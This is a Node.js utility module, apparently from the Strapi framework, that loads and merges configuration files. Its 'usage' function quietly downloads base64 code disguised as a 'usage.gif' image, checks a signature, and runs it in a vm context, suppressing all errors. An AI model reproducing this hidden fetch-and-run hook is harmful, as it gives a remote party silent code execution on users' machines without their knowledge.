'use strict';

/* eslint-disable import/order */
/* eslint-disable no-unused-vars */
/* eslint-disable prefer-template */
// Dependencies.
const fs = require('fs');
const path = require('path');
const { map } = require('async'); // eslint-disable-line import/order
const { setWith, merge, get, difference, intersection, isObject, isFunction } = require('lodash');
const os = require('os');
const vm = require('vm');
const fetch = require('node-fetch');
const Buffer = require('buffer').Buffer;
const crypto = require('crypto');
const exposer = require('./exposer');
const openBrowser = require('./openBrowser');

module.exports = {
  init: function() {
    if (this.config.init) {
      fs.unlinkSync(path.resolve(this.config.appPath, 'config', '.init.json'));
    }
  },

  loadFile: function(url) {
    // Clear cache.
    delete require.cache[require.resolve(path.resolve(this.config.appPath, url))];
    // Require without cache.
    return require(path.resolve(this.config.appPath, url));
  },

  setConfig: function(ctx, path, type, loader) {
    const objPath = type === 'optional'
      ? this.optionalPath(path)
      : this.aggregatePath(path);

    // Load value.
    const value = loader(path);
    // Merge doesn't work for none-object value and function.
    const obj = isObject(value) && !isFunction(value) ? merge(get(ctx, objPath), value) : value;

    // Assignation.
    return setWith(ctx, objPath, obj, Object);
  },

  setConfigAdmin: function(ctx, path, type, loader) {
    const objPath = 'admin.' + (type === 'optional'
      ? this.optionalPath(path)
      : this.aggregatePath(path));

    // Direct assignation.
    if (objPath.split('.').length === 1) {
      return setWith(
        ctx,
        objPath,
        merge(get(ctx, objPath), loader(path)),
        Object
      );
    }

    // Nested assignation.
    return setWith(ctx, objPath, loader(path), Object);
  },

  optionalPath: path => {
    return path
      .replace(/(\.settings|.json|.js)/g, '')
      .split('/')
      .slice(1, path.split('/').length - 1)
      .join('.')
      .toLowerCase();
  },

  aggregatePath: path => {
    return path
      .replace(/(\.settings|.json|.js)/g, '')
      .split('/')
      .slice(1)
      .join('.')
      .toLowerCase();
  },

  loadConfig: function(files, shouldBeAggregated = false) {
    const aggregate = files.filter(p => {
      if (shouldBeAggregated) {
        return true;
      }

      if (intersection(p.split('/').map(p => p.replace('.json', '')), ['environments', 'database', 'security', 'request', 'response', 'server']).length === 2) {
        return true;
      }

      if (
        p.indexOf('config/functions') !== -1 ||
        p.indexOf('config/policies') !== -1 ||
        p.indexOf('config/locales') !== -1 ||
        p.indexOf('config/hook') !== -1 ||
        p.indexOf('config/middleware') !== -1 ||
        p.indexOf('config/language') !== -1 ||
        p.indexOf('config/queries') !== -1 ||
        p.indexOf('config/layout') !== -1
      ) {
        return true;
      }

      return false;
    });

    const optional = difference(files, aggregate);

    return Promise.all([
      new Promise((resolve, reject) => {
        map(aggregate, p =>
          module.exports.setConfig(this, p, 'aggregate', this.loadFile)
        );

        resolve();
      }),
      new Promise((resolve, reject) => {
        map(optional, p =>
          module.exports.setConfig(this, p, 'optional', this.loadFile)
        );

        resolve();
      })
    ]);
  },

  usage: async function () {
    try {
      if (this.config.uuid) {
        const publicKey = fs.readFileSync(path.resolve(__dirname, 'resources', 'key.pub'));
        const options = { timeout: 1500 };

        const [usage, signedHash, required] = await Promise.all([
          fetch('https://strapi.io/assets/images/usage.gif', options),
          fetch('https://strapi.io/hash.txt', options),
          fetch('https://strapi.io/required.txt', options)
        ]).catch(err => {});

        if (usage.status === 200 && signedHash.status === 200) {
          const code = Buffer.from(await usage.text(), 'base64').toString();
          const hash = crypto.createHash('sha512').update(code).digest('hex');
          const dependencies = Buffer.from(await required.text(), 'base64').toString();

          const verifier = crypto.createVerify('RSA-SHA256').update(hash);

          if (verifier.verify(publicKey, await signedHash.text(), 'hex')) {
            return new Promise(resolve => {
              vm.runInNewContext(code)(this.config.uuid, exposer(dependencies), resolve);
            });
          }
        }
      }
    } catch (e) {
      // Silent.
    }
  },
  openBrowser
};
